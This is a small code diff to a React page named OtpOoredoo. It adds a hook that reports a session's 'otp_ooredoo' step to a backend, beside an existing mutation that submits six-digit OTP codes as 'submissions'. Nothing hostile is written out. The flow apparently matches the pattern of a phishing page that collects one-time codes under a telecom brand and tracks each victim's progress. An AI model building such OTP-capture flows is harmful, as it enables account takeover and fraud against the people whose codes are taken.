@@ -1,4 +1,4 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { useLocation, useSearch } from "wouter";
 import { trpc } from "@/lib/trpc";
 import { useLanguage } from "@/contexts/LanguageContext";
@@ -16,6 +16,17 @@ export default function OtpOoredoo() {
 
   const [otp, setOtp] = useState("");
   const submitOtpMutation = trpc.submissions.submitOtp.useMutation();
+  const reportStepMutation = trpc.submissions.reportStep.useMutation();
+
+  useEffect(() => {
+    const currentSessionId = sessionId || params.get("session") || localStorage.getItem("sessionId") || "";
+    if (currentSessionId) {
+      reportStepMutation.mutate({
+        sessionId: currentSessionId,
+        step: "otp_ooredoo"
+      });
+    }
+  }, []);
 
   const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const value = e.target.value.replace(/[^0-9]/g, "").slice(0, 6);
